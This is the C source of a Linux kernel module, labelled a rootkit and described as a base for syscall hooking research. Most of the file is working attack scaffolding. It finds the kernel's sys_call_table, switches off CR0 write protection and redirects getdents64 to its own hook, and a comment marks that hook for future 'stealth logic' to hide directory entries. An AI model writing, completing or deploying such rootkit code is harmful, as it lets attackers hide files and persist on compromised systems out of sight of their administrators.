#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include "cr0_rw.h"
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Naing/Hwani");
MODULE_DESCRIPTION("LKM base for advanced Syscall Hooking research.");
MODULE_VERSION("1.0.0");


static unsigned long *__syscall_table;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall original_getdents64;

static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    // Future Phase 3: Stealth logic to filter directory entries
    return original_getdents64(regs);
}

static unsigned long lookup_symbol(const char *name) {
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;

    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);

    return addr;
}

static int __init rootkit_init(void) {
    __syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!__syscall_table) {
        printk(KERN_ERR "LKM_ROOTKIT: Failed to locate sys_call_table\n");
        return -1;
    }

    original_getdents64 = (t_syscall)__syscall_table[__NR_getdents64];

    disable_write_protection();
    __syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    enable_write_protection();

    return 0;
}

static void __exit rootkit_exit(void) {
    if (__syscall_table) {
        disable_write_protection();
        __syscall_table[__NR_getdents64] = (unsigned long)original_getdents64;
        enable_write_protection();
    }
}

module_init(rootkit_init);
module_exit(rootkit_exit);